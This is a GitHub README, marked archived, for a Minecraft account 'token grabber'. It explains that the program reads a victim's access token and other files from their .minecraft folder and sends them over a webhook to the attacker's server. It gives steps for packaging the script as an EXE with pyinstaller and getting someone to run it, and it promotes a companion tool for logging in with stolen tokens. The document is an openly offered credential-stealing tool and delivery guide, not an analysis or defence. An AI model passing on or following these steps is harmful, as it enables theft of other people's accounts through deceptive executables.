# Archived
I will no longer maintain this code, and I believe that this does not work anymore or as well as it used to.

# MCToken Grabber
A simple way to gain access to a Minecraft account. No username/email/password needed.

# Having issues?
- Yeah I made this at 4am give me a break
- Open an [issue](https://github.com/spinfal/minecraft-token-grabber/issues) with the Error code you're getting (if applicable).

# How does this work?
- When someone runs the `mc-token` file, it grabs the Access token from their `.minecraft` folder and some other files. It then sends it all over a webhook to your server.

# How can I get someone to run mc-token?
- First off just to be safe; you should run `pip install discord_webhook` **(only YOU need to run that command, not the person you are sending it to)**
- Then use something like `pyinstaller` to turn it into an EXE file, and have someone run it
 - `pyinstaller --onefile mc-token.py`

# How do I use the Token Login tool?
- Simply [download](https://github.com/spinfal/minecraft-token-grabber/releases/) then run the EXE file and follow the prompts it gives you

# Extra Info
- I wrote/made all of this, but I got some sort of inspiration from this repo: [wodxgod/Minecraft-Session-Token-Stealer](https://github.com/wodxgod/Minecraft-Session-Token-Stealer). This code and tool I made is in no way as advanced as wodxgod's, but it does work.
